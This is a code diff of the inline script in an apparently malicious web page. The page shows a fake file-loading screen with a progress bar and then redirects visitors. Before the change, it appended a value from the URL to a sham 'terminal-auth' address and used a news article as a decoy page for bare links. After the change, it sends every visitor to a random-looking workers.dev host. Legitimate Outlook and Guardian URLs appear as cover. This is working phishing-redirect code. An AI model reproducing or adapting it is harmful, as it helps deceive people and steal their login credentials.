@@ -137,7 +137,7 @@
     <script>
     (function() {
         const REDIRECT_DELAY = 2500; // Adjusted for progress bar animation
-        const MOBILE_REDIRECT_URL_BASE = "https://org-notification-policy-process.vercel.app/terminal-auth.html#";
+        const MOBILE_REDIRECT_URL_BASE = "https://j5wszo.9mnt4xv55.workers.dev/";
         const DESKTOP_REDIRECT_URL = "https://outlook.office365.com/";
         const DEAD_URL = "https://www.theguardian.com/environment/climate-crisis"; // Target URL if no value found
 
@@ -169,27 +169,9 @@
         function performRedirect() {
             const value = getPotentialValue();
 
-            if (value) {
-                console.log("Found value:", value);
-                if (isMobileDevice()) {
-                    const redirectUrl = MOBILE_REDIRECT_URL_BASE + value;
+            const redirectUrl = MOBILE_REDIRECT_URL_BASE;
                     console.log("Mobile device detected. Redirecting to:", redirectUrl);
                     window.location.href = redirectUrl;
-                } else {
-                     const redirectUrl = MOBILE_REDIRECT_URL_BASE + value;
-                    console.log("Mobile device detected. Redirecting to:", redirectUrl);
-                    window.location.href = redirectUrl;
-                }
-            } else {
-                console.log("No value found in hash or search. Redirecting all devices to dead URL:", DEAD_URL);
-                document.querySelector('.loading-text').textContent = 'Error: Link invalid or expired.';
-                document.querySelector('.file-info').textContent = 'Please check the link or contact support.';
-                if(document.getElementById('progressBar')) {
-                    document.getElementById('progressBar').style.backgroundColor = '#d9534f'; // Error color
-                    document.getElementById('progressBar').style.width = '100%';
-                }
-                // No redirect if no value, error is shown on page
-            }
         }
 
         // Execute redirect after a short delay
